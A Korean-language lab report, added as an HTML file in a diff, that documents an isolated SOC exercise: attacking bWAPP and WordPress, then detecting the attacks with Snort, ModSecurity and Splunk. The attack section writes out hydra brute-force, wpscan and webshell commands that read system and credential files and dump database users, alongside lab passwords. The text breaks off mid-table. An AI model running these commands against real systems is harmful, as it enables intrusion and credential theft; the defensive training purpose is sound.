@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<title>SIEM 공격 탐지 및 대응 실습 — 프로젝트 요약 보고서</title>
+<style>
+  @page {
+    size: A4;
+    margin: 20mm 18mm 25mm 18mm;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Noto Sans KR', 'Malgun Gothic', sans-serif;
+    font-size: 11pt;
+    line-height: 1.7;
+    color: #1a1a1a;
+    background: #fff;
+  }
+  .page-break { page-break-after: always; }
+
+  /* Cover Page */
+  .cover {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: center;
+    background: linear-gradient(135deg, #0c2340 0%, #1a3a5c 40%, #2a5a8c 100%);
+    color: #fff;
+    padding: 40px;
+  }
+  .cover-badge {
+    display: inline-block;
+    border: 2px solid rgba(255,255,255,0.4);
+    border-radius: 8px;
+    padding: 8px 24px;
+    font-size: 12pt;
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 40px;
+    color: rgba(255,255,255,0.8);
+  }
+  .cover h1 {
+    font-size: 28pt;
+    font-weight: 800;
+    margin-bottom: 12px;
+    line-height: 1.3;
+  }
+  .cover h2 {
+    font-size: 16pt;
+    font-weight: 400;
+    color: rgba(255,255,255,0.85);
+    margin-bottom: 50px;
+  }
+  .cover-meta {
+    font-size: 11pt;
+    color: rgba(255,255,255,0.7);
+    line-height: 2;
+  }
+  .cover-line {
+    width: 80px;
+    height: 3px;
+    background: #4da6ff;
+    margin: 30px auto;
+  }
+
+  /* TOC */
+  .toc { padding: 40px 0; }
+  .toc h2 { font-size: 20pt; margin-bottom: 30px; color: #0c2340; border-bottom: 3px solid #0c2340; padding-bottom: 10px; }
+  .toc-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: baseline;
+    padding: 8px 0;
+    border-bottom: 1px dotted #ccc;
+    font-size: 11pt;
+  }
+  .toc-item.chapter { font-weight: 700; font-size: 12pt; padding-top: 14px; }
+
+  /* Chapter headings */
+  h1.chapter {
+    font-size: 22pt;
+    color: #0c2340;
+    border-bottom: 3px solid #2a5a8c;
+    padding-bottom: 8px;
+    margin: 30px 0 20px 0;
+  }
+  h2.section {
+    font-size: 15pt;
+    color: #1a3a5c;
+    margin: 24px 0 12px 0;
+    padding-left: 12px;
+    border-left: 4px solid #4da6ff;
+  }
+  h3.subsection {
+    font-size: 12pt;
+    color: #2a5a8c;
+    margin: 18px 0 8px 0;
+  }
+
+  /* Tables */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 12px 0 20px 0;
+    font-size: 9.5pt;
+  }
+  th {
+    background: #0c2340;
+    color: #fff;
+    padding: 8px 10px;
+    text-align: left;
+    font-weight: 600;
+    font-size: 9pt;
+  }
+  td {
+    padding: 6px 10px;
+    border-bottom: 1px solid #ddd;
+    vertical-align: top;
+  }
+  tr:nth-child(even) { background: #f5f8fc; }
+  tr:hover { background: #e8f0fa; }
+
+  /* Images */
+  .img-container {
+    margin: 16px 0;
+    text-align: center;
+    page-break-inside: avoid;
+  }
+  .img-container img {
+    max-width: 100%;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+  }
+  .img-caption {
+    font-size: 9pt;
+    color: #666;
+    margin-top: 6px;
+    font-style: italic;
+  }
+
+  /* Code blocks */
+  pre {
+    background: #1e1e1e;
+    color: #d4d4d4;
+    padding: 14px 18px;
+    border-radius: 6px;
+    font-size: 9pt;
+    line-height: 1.5;
+    overflow-x: auto;
+    margin: 10px 0 16px 0;
+    page-break-inside: avoid;
+  }
+  code { font-family: 'Consolas', 'Monaco', monospace; }
+  p code {
+    background: #f0f0f0;
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 9.5pt;
+    color: #c7254e;
+  }
+
+  /* Info boxes */
+  .info-box {
+    background: #e8f4fd;
+    border-left: 4px solid #2196f3;
+    padding: 12px 16px;
+    margin: 12px 0;
+    border-radius: 0 4px 4px 0;
+    font-size: 10pt;
+  }
+  .warn-box {
+    background: #fff3e0;
+    border-left: 4px solid #ff9800;
+    padding: 12px 16px;
+    margin: 12px 0;
+    border-radius: 0 4px 4px 0;
+    font-size: 10pt;
+  }
+  .critical-box {
+    background: #fce4ec;
+    border-left: 4px solid #e53935;
+    padding: 12px 16px;
+    margin: 12px 0;
+    border-radius: 0 4px 4px 0;
+    font-size: 10pt;
+  }
+
+  /* Topology diagram */
+  .topology {
+    background: #f8f9fa;
+    border: 1px solid #ddd;
+    border-radius: 8px;
+    padding: 20px;
+    margin: 16px 0;
+    font-family: 'Consolas', monospace;
+    font-size: 9.5pt;
+    line-height: 1.6;
+    white-space: pre;
+    page-break-inside: avoid;
+  }
+
+  /* Summary stats */
+  .stats-row {
+    display: flex;
+    gap: 16px;
+    margin: 16px 0;
+    flex-wrap: wrap;
+  }
+  .stat-card {
+    flex: 1;
+    min-width: 140px;
+    background: #f5f8fc;
+    border: 1px solid #ddd;
+    border-top: 4px solid #2a5a8c;
+    border-radius: 0 0 6px 6px;
+    padding: 16px;
+    text-align: center;
+  }
+  .stat-card .number {
+    font-size: 24pt;
+    font-weight: 800;
+    color: #0c2340;
+  }
+  .stat-card .label {
+    font-size: 9pt;
+    color: #666;
+    margin-top: 4px;
+  }
+  .stat-card.critical { border-top-color: #e53935; }
+  .stat-card.critical .number { color: #e53935; }
+  .stat-card.success { border-top-color: #2e7d32; }
+  .stat-card.success .number { color: #2e7d32; }
+
+  /* Timeline */
+  .timeline { margin: 16px 0; padding-left: 24px; border-left: 3px solid #2a5a8c; }
+  .timeline-item {
+    position: relative;
+    padding: 8px 0 16px 20px;
+    page-break-inside: avoid;
+  }
+  .timeline-item::before {
+    content: '';
+    position: absolute;
+    left: -27px;
+    top: 12px;
+    width: 10px;
+    height: 10px;
+    background: #2a5a8c;
+    border-radius: 50%;
+  }
+  .timeline-item.critical::before { background: #e53935; }
+  .timeline-time {
+    font-size: 9pt;
+    color: #888;
+    font-weight: 600;
+  }
+  .timeline-title {
+    font-weight: 700;
+    color: #1a1a1a;
+  }
+  .timeline-desc {
+    font-size: 10pt;
+    color: #555;
+  }
+
+  /* Footer */
+  .footer {
+    font-size: 8pt;
+    color: #999;
+    text-align: center;
+    margin-top: 40px;
+    padding-top: 12px;
+    border-top: 1px solid #ddd;
+  }
+
+  p { margin: 6px 0; }
+  ul, ol { margin: 8px 0 8px 20px; }
+  li { margin: 4px 0; }
+
+  @media print {
+    .cover { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    th { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .stat-card { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ==================== COVER PAGE ==================== -->
+<div class="cover">
+  <div class="cover-badge">Security Operations Center</div>
+  <h1>SIEM 공격 탐지 및<br>대응 실습 프로젝트</h1>
+  <h2>통합보안관제 가상환경 구축부터 킬체인 공격·탐지·대응까지</h2>
+  <div class="cover-line"></div>
+  <div class="cover-meta">
+    <p>작성일: 2026년 8월 27일</p>
+    <p>환경: 격리된 가상 SOC 실습 랩 (사설 IP 대역)</p>
+    <p>범위: Phase 1~4 (공격 수행 → 탐지 구축 → 킬체인 시뮬레이션 → 관제 운영)</p>
+  </div>
+</div>
+<div class="page-break"></div>
+
+<!-- ==================== TOC ==================== -->
+<div class="toc">
+  <h2>목차</h2>
+  <div class="toc-item chapter"><span>1. 프로젝트 개요</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;1-1. 목적 및 범위</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;1-2. 핵심 성과 요약</span></div>
+  <div class="toc-item chapter"><span>2. 환경 구성</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;2-1. 초기 환경 (Phase 1~2)</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;2-2. 환경 확장 (Phase 2.5) — 왜 확장했는가</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;2-3. 최종 네트워크 토폴로지</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;2-4. 자산 목록 및 로그 수집 체계</span></div>
+  <div class="toc-item chapter"><span>3. 공격 수행</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;3-1. Phase 1: Bee-box 기본 공격 (정찰·SQLi·XSS·명령주입)</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;3-2. Phase 3: WordPress 킬체인 7단계 공격</span></div>
+  <div class="toc-item chapter"><span>4. 탐지 엔지니어링</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;4-1. Snort IDS 커스텀 룰</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;4-2. ModSecurity WAF</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;4-3. Splunk SIEM Alert 설계</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;4-4. SOC 대시보드 (SOC_Monitor)</span></div>
+  <div class="toc-item chapter"><span>5. 관제 운영</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;5-1. 대시보드 모니터링 및 경보 분류</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;5-2. 정탐/오탐 판별</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;5-3. 관제 일지 (INC-001 ~ INC-006)</span></div>
+  <div class="toc-item chapter"><span>6. 대응 및 검증</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;6-1. 대응 타임라인</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;6-2. IP 차단 및 검증</span></div>
+  <div class="toc-item chapter"><span>7. 분석 및 개선 권고</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;7-1. MITRE ATT&CK 매핑</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;7-2. 탐지 커버리지 분석</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;7-3. 개선 권고사항</span></div>
+  <div class="toc-item chapter"><span>8. SOC 분석가 사고 확장</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;8-1. STRIDE 위협 모델링</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;8-2. PASTA 비즈니스 영향 분석</span></div>
+  <div class="toc-item"><span>&nbsp;&nbsp;&nbsp;8-3. EDR 연계 및 AI 활용 방향</span></div>
+</div>
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 1 ==================== -->
+<h1 class="chapter">1. 프로젝트 개요</h1>
+
+<h2 class="section">1-1. 목적 및 범위</h2>
+
+<p>본 프로젝트는 통합보안관제(SOC) 가상환경에서 <strong>공격 수행 → 탐지/분석 → 관제 대응</strong>까지 전체 사이클을 실습하고 기록하는 <strong>방어 보안(교육용) 프로젝트</strong>이다.</p>
+
+<div class="info-box">
+  <strong>핵심 목표:</strong> 격리된 실습 랩에서 실제 공격 도구(nmap, hydra, sqlmap, wpscan)를 사용하여 킬체인 공격을 수행하고, Snort IDS + ModSecurity WAF + Splunk SIEM 기반 탐지·대응 체계의 효과를 검증한다.
+</div>
+
+<p><strong>프로젝트 구성 (4+1 Phase):</strong></p>
+<table>
+  <tr><th>Phase</th><th>내용</th><th>기간</th></tr>
+  <tr><td><strong>Phase 1</strong></td><td>Bee-box(bWAPP) 대상 기본 공격 수행 — 정찰, SQLi, XSS, 명령주입, 브루트포스</td><td>8/3~8/10</td></tr>
+  <tr><td><strong>Phase 2</strong></td><td>Snort IDS 탐지 분석 + pfSense 방화벽 정책 수립</td><td>8/10~8/11</td></tr>
+  <tr><td><strong>Phase 2.5</strong></td><td>실제 운영 환경 확장 구축 — WordPress, ModSecurity, MySQL, rsyslog</td><td>8/18~8/25</td></tr>
+  <tr><td><strong>Phase 3</strong></td><td>WordPress 킬체인 7단계 공격 + 커스텀 탐지 룰 구축</td><td>8/25~8/26</td></tr>
+  <tr><td><strong>Phase 4</strong></td><td>SOC 관제 운영 — 대시보드, Alert, 관제 일지, 최종 보고서</td><td>8/27</td></tr>
+</table>
+
+<h2 class="section">1-2. 핵심 성과 요약</h2>
+
+<div class="stats-row">
+  <div class="stat-card">
+    <div class="number">7</div>
+    <div class="label">킬체인 공격 단계</div>
+  </div>
+  <div class="stat-card success">
+    <div class="number">5/7</div>
+    <div class="label">완전 탐지 단계</div>
+  </div>
+  <div class="stat-card critical">
+    <div class="number">4</div>
+    <div class="label">Critical Alert 트리거</div>
+  </div>
+  <div class="stat-card success">
+    <div class="number">100%</div>
+    <div class="label">차단 검증 성공률</div>
+  </div>
+</div>
+
+<ul>
+  <li>7단계 킬체인 중 <strong>5단계 완전 탐지</strong>, 1단계 부분 탐지, 1단계 네트워크 차단 성공</li>
+  <li>Splunk Alert 5개 중 <strong>4개 정상 트리거</strong> 확인 (7건 총 트리거)</li>
+  <li>공격자 IP 차단 후 재공격 시 <strong>완전 차단</strong> 검증</li>
+  <li>데이터 유출 시도는 DMZ 아웃바운드 차단 정책에 의해 <strong>사전 차단</strong></li>
+</ul>
+
+<div class="warn-box">
+  <strong>주요 발견사항:</strong> 시그니처 기반 IDS(Snort)만으로는 행위 기반 공격(브루트포스) 탐지에 한계가 있어 다중 로그 소스 상관분석이 필수적이다. DMZ↔Inner-net 간 DB 통신 허용 규칙이 공격 피벗에 악용될 수 있다.
+</div>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 2 ==================== -->
+<h1 class="chapter">2. 환경 구성</h1>
+
+<h2 class="section">2-1. 초기 환경 (Phase 1~2)</h2>
+
+<p>초기 환경은 <strong>att-mint(공격자) → pfSense(방화벽+Snort) → Bee-box(취약 웹서버)</strong>의 단순 구조였다. 공격자가 pfSense NAT를 통해 DMZ의 Bee-box(bWAPP)에 접근하고, Snort가 네트워크 트래픽을 모니터링하는 구조이다.</p>
+
+<p>Phase 1에서 Bee-box 대상 기본 공격(정찰, SQLi, XSS, 명령주입, 브루트포스)을 수행하고 Phase 2에서 Snort 탐지 분석 및 방화벽 정책을 수립하였다.</p>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase2-detect/images/fw-1st-after.png" alt="pfSense 방화벽 룰 설정">
+  <div class="img-caption">[그림 2-1] pfSense WAN 방화벽 룰 — Phase 2에서 공격자 IP(10.50.50.17) 차단 룰 적용</div>
+</div>
+
+<h2 class="section">2-2. 환경 확장 (Phase 2.5) — 왜 확장했는가</h2>
+
+<p>초기 환경에서 Bee-box는 의도적으로 취약하게 설계된 학습용 서버로, <strong>실제 운영 환경과 큰 차이</strong>가 있었다. 실무 SOC 관제 능력을 기르기 위해 다음과 같이 환경을 확장하였다:</p>
+
+<table>
+  <tr><th>구분</th><th>초기 환경 (Phase 1~2)</th><th>확장 환경 (Phase 2.5~)</th><th>확장 사유</th></tr>
+  <tr><td><strong>공격 대상</strong></td><td>Bee-box (bWAPP)</td><td>WordPress 7.1 + ModSecurity WAF</td><td>실제 운영되는 CMS 환경에서의 공격·탐지 실습</td></tr>
+  <tr><td><strong>DB 서버</strong></td><td>Bee-box 내장 DB</td><td>MySQL (별도 서버, Inner-net)</td><td>DB 서버 분리 → 네트워크 세그멘테이션 + 피벗 공격 시나리오</td></tr>
+  <tr><td><strong>WAF</strong></td><td>없음</td><td>ModSecurity 2.9.3 + OWASP CRS 3.2.0</td><td>WAF 탐지 로그 기반 분석 능력 확보</td></tr>
+  <tr><td><strong>로그 수집</strong></td><td>Snort syslog만</td><td>8개 소스 → Splunk 4개 인덱스</td><td>다중 소스 상관분석(SIEM 핵심 역량)</td></tr>
+  <tr><td><strong>공격자</strong></td><td>att-mint (1대)</td><td>att-mint + Kali Linux (2대)</td><td>전문 공격 도구(wpscan, hydra, sqlmap) 활용</td></tr>
+  <tr><td><strong>관제 PC</strong></td><td>없음</td><td>mng-mint (10.0.50.17)</td><td>정상 유저 트래픽 생성 + 관제 업무 분리</td></tr>
+</table>
+
+<div class="info-box">
+  <strong>확장의 핵심 목적:</strong> "공격이 가능한 환경"에서 "공격을 탐지하고 대응해야 하는 환경"으로 전환. 실무 SOC에서 요구하는 다중 로그 소스 상관분석, WAF 로그 해석, 킬체인 기반 탐지 전략 수립 능력을 기르기 위함이다.
+</div>
+
+<h2 class="section">2-3. 최종 네트워크 토폴로지</h2>
+
+<div class="topology">
+att-mint(10.50.50.17) ──att-net──→ VyOS ──rf-net──→ pfSense(+Snort IPS)
+Kali   (10.50.50.30) ─┘                                  │
+                                                     ┌─ dmz-net ──→ WordPress(10.0.10.80) + ModSecurity WAF
+                                                     │              Bee-box  (10.0.10.50)
+                                                     ├─ inner-net ──→ Splunk(10.0.100.50)
+                                                     │                MySQL (10.0.100.60)
+                                                     └─ mng-net ──→ mng-mint(10.0.50.17, 관제+정상유저)</div>
+
+<h2 class="section">2-4. 자산 목록 및 로그 수집 체계</h2>
+
+<table>
+  <tr><th>자산</th><th>IP</th><th>역할</th><th>보안 솔루션</th></tr>
+  <tr><td><strong>pfSense</strong></td><td>WAN 10.0.0.254</td><td>방화벽 + IPS</td><td>Snort (GPLv2 + ET Open + 커스텀 룰 9개)</td></tr>
+  <tr><td><strong>WordPress</strong></td><td>10.0.10.80</td><td>회사 홈페이지 (DMZ)</td><td>ModSecurity 2.9.3 + OWASP CRS 3.2.0</td></tr>
+  <tr><td><strong>MySQL</strong></td><td>10.0.100.60</td><td>DB 서버 (Inner-net)</td><td>—</td></tr>
+  <tr><td><strong>Splunk</strong></td><td>10.0.100.50</td><td>SIEM (Inner-net)</td><td>4개 인덱스, 8개 로그 소스</td></tr>
+  <tr><td><strong>Kali</strong></td><td>10.50.50.30</td><td>공격자 (att-net)</td><td>—</td></tr>
+  <tr><td><strong>mng-mint</strong></td><td>10.0.50.17</td><td>관제/관리 PC</td><td>—</td></tr>
+</table>
+
+<h3 class="subsection">로그 수집 체계 (8개 소스 → Splunk 4개 인덱스)</h3>
+
+<table>
+  <tr><th>로그 소스</th><th>수집 경로</th><th>Splunk 인덱스</th><th>용도</th></tr>
+  <tr><td>Snort alerts</td><td>pfSense syslog → UDP 514</td><td>pfsense</td><td>네트워크 레벨 탐지</td></tr>
+  <tr><td>pfSense filterlog</td><td>pfSense syslog → UDP 514</td><td>pfsense</td><td>방화벽 로그</td></tr>
+  <tr><td>Apache access log</td><td>rsyslog → TCP 9514</td><td>idx_web</td><td>HTTP 요청 기록</td></tr>
+  <tr><td>Apache error log</td><td>rsyslog → TCP 9514</td><td>idx_web</td><td>에러 및 WAF 로그</td></tr>
+  <tr><td>ModSecurity audit</td><td>rsyslog → TCP 9514</td><td>idx_web</td><td>WAF 탐지 상세</td></tr>
+  <tr><td>WP auth log</td><td>rsyslog → TCP 9514</td><td>idx_web</td><td>로그인 시도 기록</td></tr>
+  <tr><td>MySQL error log</td><td>rsyslog → TCP 9516</td><td>idx_db</td><td>DB 에러</td></tr>
+  <tr><td>MySQL slow query</td><td>rsyslog → TCP 9516</td><td>idx_db</td><td>느린 쿼리</td></tr>
+</table>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 3 ==================== -->
+<h1 class="chapter">3. 공격 수행</h1>
+
+<h2 class="section">3-1. Phase 1: Bee-box 기본 공격</h2>
+
+<p>Phase 1에서는 att-mint(10.50.50.17)에서 pfSense NAT를 통해 Bee-box(bWAPP)를 대상으로 <strong>정찰 4단계 + 공격 7종</strong>을 수행하였다.</p>
+
+<h3 class="subsection">정찰 (Reconnaissance)</h3>
+
+<p>정찰은 <strong>넓게 → 좁게</strong>(포트 → 버전 → 웹설정 → 숨은경로) 순서로 공격 지도를 완성하는 과정이다.</p>
+
+<table>
+  <tr><th>단계</th><th>도구</th><th>목적</th><th>결과</th></tr>
+  <tr><td>R-1</td><td><code>nmap -sS</code></td><td>열린 포트 파악</td><td>80/tcp만 열림 → 웹이 유일 표적</td></tr>
+  <tr><td>R-2</td><td><code>nmap -sV</code></td><td>서비스·버전 식별</td><td>Apache 2.2.8, PHP 5.2.4 (EOL)</td></tr>
+  <tr><td>R-3</td><td><code>nikto</code></td><td>웹서버 취약점</td><td>TRACE 허용, phpMyAdmin 노출</td></tr>
+  <tr><td>R-4</td><td><code>dirb</code></td><td>숨은 경로 탐색</td><td>/drupal, /phpmyadmin, /webdav 발견</td></tr>
+</table>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase1-attack/images/R-1-nmap.png" alt="Nmap 포트 스캔 결과">
+  <div class="img-caption">[그림 3-1] Nmap TCP 포트 스캔 — 80/tcp(HTTP)만 열려있어 웹 공격에 집중</div>
+</div>
+
+<h3 class="subsection">주요 공격 수행</h3>
+
+<table>
+  <tr><th>공격</th><th>도구</th><th>대상</th><th>결과</th><th>Snort 탐지</th></tr>
+  <tr><td>E-1 SQL Injection</td><td>수동 입력</td><td>bWAPP SQLi 페이지</td><td>DB 데이터 추출 성공</td><td>ET WEB_SERVER 탐지</td></tr>
+  <tr><td>E-2 SQLmap</td><td>sqlmap</td><td>bWAPP SQLi 페이지</td><td>자동화 SQLi 성공</td><td>ET WEB_SERVER 탐지</td></tr>
+  <tr><td>E-3 Reflected XSS</td><td>수동 입력</td><td>bWAPP XSS 페이지</td><td>Cookie 탈취 성공</td><td>탐지됨</td></tr>
+  <tr><td>E-4 Stored XSS</td><td>수동 입력</td><td>bWAPP Blog</td><td>저장형 XSS 성공</td><td>탐지됨</td></tr>
+  <tr><td>E-5 OS 명령주입</td><td>수동 입력</td><td>bWAPP Command Injection</td><td>www-data 권한 확인</td><td>ET ATTACK_RESPONSE</td></tr>
+  <tr><td>E-6 경로순회</td><td>수동 입력</td><td>bWAPP Directory Traversal</td><td>/etc/passwd 열람</td><td>탐지됨</td></tr>
+  <tr><td>E-7 브루트포스</td><td>hydra</td><td>bWAPP 로그인</td><td>비밀번호 사전 공격</td><td>탐지됨</td></tr>
+</table>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase1-attack/images/E-5-cmdi-whoami.png" alt="OS 명령 주입 공격">
+  <div class="img-caption">[그림 3-2] OS Command Injection — DNS lookup 필드에 명령 삽입, www-data 권한 확인</div>
+</div>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase1-attack/images/E-7-bruteforce.png" alt="Hydra 브루트포스 공격">
+  <div class="img-caption">[그림 3-3] Hydra 브루트포스 — bWAPP 로그인 페이지 대상 사전 공격 수행</div>
+</div>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase1-attack/images/E-1-sqli.png" alt="Splunk에서 SQL Injection 탐지">
+  <div class="img-caption">[그림 3-4] Splunk에서 SQL Injection 공격 탐지 — ET WEB_SERVER SELECT USER SQL Injection 이벤트</div>
+</div>
+
+<div class="page-break"></div>
+
+<h2 class="section">3-2. Phase 3: WordPress 킬체인 7단계 공격</h2>
+
+<p>Phase 2.5에서 구축한 실제 운영 환경(WordPress + MySQL + ModSecurity)을 대상으로 Kali Linux(10.50.50.30)에서 <strong>킬체인 7단계 공격</strong>을 수행하였다.</p>
+
+<div class="critical-box">
+  <strong>공격 시나리오:</strong> "외부 해커가 회사 홈페이지를 통해 고객 DB 탈취 시도"
+</div>
+
+<table>
+  <tr><th>단계</th><th>Kill Chain</th><th>MITRE ATT&CK</th><th>도구</th><th>결과</th></tr>
+  <tr><td><strong>1. 정찰</strong></td><td>Reconnaissance</td><td>T1595</td><td>wpscan, nmap</td><td>WP 7.1, XML-RPC 활성화, Upload 리스팅 노출</td></tr>
+  <tr><td><strong>2. 초기 침투</strong></td><td>Weaponization</td><td>T1190</td><td>sqlmap</td><td>SQLi 실패 (Prepared Statement 보호)</td></tr>
+  <tr><td><strong>3. 인증 공격</strong></td><td>Delivery</td><td>T1110</td><td>hydra</td><td>admin/rlaquddn1@ 크래킹 성공 (965건)</td></tr>
+  <tr><td><strong>4. 지속성</strong></td><td>Exploitation</td><td>T1505.003</td><td>WP File Manager</td><td>hello.php 웹쉘 삽입, /?cmd= 명령 실행</td></tr>
+  <tr><td><strong>5. 내부 정찰</strong></td><td>Installation</td><td>T1046</td><td>웹쉘 CLI</td><td>DB 인증정보 획득 (wp-config.php)</td></tr>
+  <tr><td><strong>6. DB 접근</strong></td><td>C2</td><td>T1213</td><td>mysql (웹쉘)</td><td>wp_users 테이블 탈취 (admin 해시)</td></tr>
+  <tr><td><strong>7. 유출 시도</strong></td><td>Actions</td><td>T1041</td><td>curl</td><td>Connection refused — 아웃바운드 차단</td></tr>
+</table>
+
+<h3 class="subsection">킬체인 상세: 정찰 (WPScan)</h3>
+<pre><code># Kali (10.50.50.30)
+wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --force
+
+# 결과: 1,970 requests / 약 4분
+# WordPress 7.1, XML-RPC 활성화, Upload 디렉토리 리스팅
+# Snort 탐지: pfSense SID 1000001 "LOCAL WordPress wpscan detected" → 1,973 이벤트</code></pre>
+
+<h3 class="subsection">킬체인 상세: 브루트포스 (hydra)</h3>
+<pre><code># Kali (10.50.50.30)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  10.0.0.254 -s 8080 http-post-form \
+  "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid"
+
+# 결과: 965건 시도 후 admin/rlaquddn1@ 크래킹 성공
+# Splunk Alert: Brute Force Detection (Critical) 트리거</code></pre>
+
+<h3 class="subsection">킬체인 상세: 웹쉘 명령 실행</h3>
+<pre><code># 웹쉘을 통한 시스템 명령 실행
+http://10.0.0.254:8080/?cmd=id           → uid=33(www-data)
+http://10.0.0.254:8080/?cmd=whoami       → www-data
+http://10.0.0.254:8080/?cmd=cat+/etc/passwd  → 시스템 계정 목록 노출
+
+# wp-config.php DB 인증정보 유출
+http://10.0.0.254:8080/?cmd=cat+wp-config.php
+  → DB_NAME: wordpress, DB_USER: wp_admin, DB_PASSWORD: WpAdmin!2024
+  → DB_HOST: 10.0.100.60</code></pre>
+
+<h3 class="subsection">킬체인 상세: DB 데이터 탈취</h3>
+<pre><code># 웹쉘 경유 MySQL 직접 접근
+http://10.0.0.254:8080/?cmd=mysql+-u+wp_admin+-pWpAdmin!2024+-h+10.0.100.60+wordpress+
+  -e+"SELECT+user_login,user_email,user_pass+FROM+wp_users"
+
+# 결과: admin 계정 정보 유출 (user_login, user_email, user_pass bcrypt 해시)</code></pre>
+
+<div class="page-break"></div>
+
+<!-- ==================== CHAPTER 4 ==================== -->
+<h1 class="chapter">4. 탐지 엔지니어링</h1>
+
+<h2 class="section">4-1. Snort IDS 커스텀 룰</h2>
+
+<p>pfSense의 Snort에 기본 룰셋(GPLv2 + ET Open) 외에 WordPress 공격 탐지를 위한 <strong>커스텀 룰 9개</strong>를 추가하였다.</p>
+
+<table>
+  <tr><th>pfSense SID</th><th>탐지 대상</th><th>시그니처</th><th>실제 탐지 건수</th></tr>
+  <tr><td>1000001</td><td>WPScan 스캐너</td><td>User-Agent "WPScan" 탐지</td><td>1,973건</td></tr>
+  <tr><td>1000002</td><td>WP 브루트포스</td><td>POST /wp-login.php 반복</td><td>8건 (네트워크 레벨)</td></tr>
+  <tr><td>1000004</td><td>SQL Injection</td><td>UNION SELECT 패턴</td><td>4건</td></tr>
+  <tr><td>1000006</td><td>웹쉘 접근</td><td>cmd= 파라미터 탐지</td><td>탐지됨</td></tr>
+</table>
+
+<div class="warn-box">
+  <strong>교훈:</strong> Snort 브루트포스 탐지(8건)와 Apache 로그 기반 탐지(965건)의 극심한 차이 발견. Snort는 네트워크 패킷 레벨에서 HTTP POST body를 제한적으로 검사하므로, 브루트포스 탐지에는 <strong>Apache 로그 기반 Alert이 주 탐지 소스</strong>가 되어야 한다.
+</div>
+
+<div class="img-container">
+  <img src="/home/user/siem-project/phase2-detect/images/snort-alerts-overview.png" alt="pfSense Snort Alerts 화면">
+  <div class="img-caption">[그림 4-1] pfSense Snort Alerts — WAN 인터페이스에서 탐지된 경보 목록</div>
+</div>
+
+<h2 class="section">4-2. ModSecurity WAF</h2>
+
+<p>WordPress 서버에 <strong>ModSecurity 2.9.3 + OWASP CRS 3.2.0</strong>을 DetectionOnly 모드로 설치하였다.</p>
+
+<table>
+  <tr><th>ModSecurity Rule</th><th>탐지 내용</th><th>탐지 공격</th></tr>
+  <tr><td>913100</td><td>Found User-Agent associated with security scanner</td><td>hydra, sqlmap 탐지</td></tr>
+  <tr><td>949110</td><td>Inbound Anomaly Score Exceeded</td><td>복합 공격 탐지 (Score: 8 CRITICAL)</td></tr>
+  <tr><td>980130</td><td>Anomaly Score Exceeded (Total)</td><td>누적 이상 점수 초과</td></tr>
+</table>
+
+<h2 class="section">4-3. Splunk SIEM Alert 설계</h2>
+
+<p>킬체인 각 단계를 탐지하기 위해 <strong>5개 Splunk Alert</strong>를 설계하였다.</p>
+
+<table>
+  <tr><th>Alert</th><th>Severity</th><th>쿼리</th><th>주기</th><th>트리거 결과</th></tr>
+  <tr><td><strong>Brute Force Detection</strong></td><td>Critical</td><td><code>index=idx_web "wp-login.php" "POST" | stats count | where count >= 10</code></td><td>*/5분</td><td>19:20 트리거</td></tr>
+  <tr><td><strong>Scanner Detection</strong></td><td>High</td><td><code>index=pfsense "1000001" | stats count | where count >= 10</code></td><td>*/5분</td><td>타이밍 미스매치</td></tr>
+  <tr><td><strong>SQL Injection Detection</strong></td><td>Critical</td><td><code>index=pfsense ("SQL" OR "1000004") "Priority" | stats count | where count >= 2</code></td><td>*/5분</td><td>19:35 트리거</td></tr>
